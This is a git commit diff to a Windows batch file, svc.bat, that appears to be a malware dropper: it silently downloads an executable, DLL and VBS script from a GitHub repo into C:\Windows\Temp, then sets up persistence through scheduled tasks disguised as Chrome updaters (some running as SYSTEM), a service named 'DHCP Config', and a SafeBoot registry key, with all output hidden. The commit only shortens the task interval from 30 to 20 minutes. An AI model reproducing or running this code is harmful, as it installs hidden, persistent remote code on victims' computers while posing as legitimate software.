6cfc8c957b490cc2b3745b2663155ae2de4104bb
NoManCan <tiger_man_student@yahoo.com>
2025-02-03 17:18:06 +0400

    Update svc.bat

--- svc.bat
+++ svc.bat
@@ -5,8 +5,8 @@ curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/libssl-3.d
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.exe > C:\Windows\Temp\svclhost.exe
 curl -s https://raw.githubusercontent.com/NoManCan/NC/refs/heads/main/svclhost.vbs > C:\Windows\Temp\svclhost.vbs
 set tt=%time:~0,5%
-SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
-SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
+SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /F >nul 2>&1
+SCHTASKS /CREATE /SC MINUTE /MO 20 /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" /ST %tt% /RU system /F >nul 2>&1
 SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpdater" >nul 2>&1
 sc.exe create iphlpsvcs binpath= "WScript.exe //Nologo //B C:\Windows\Temp\svclhost.vbs" group= NetworkProvider type= own start= auto error= ignore displayname= "DHCP Config" >nul 2>&1
 cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\iphlpsvcs" /f /t REG_SZ /d "Service" >nul 2>&1
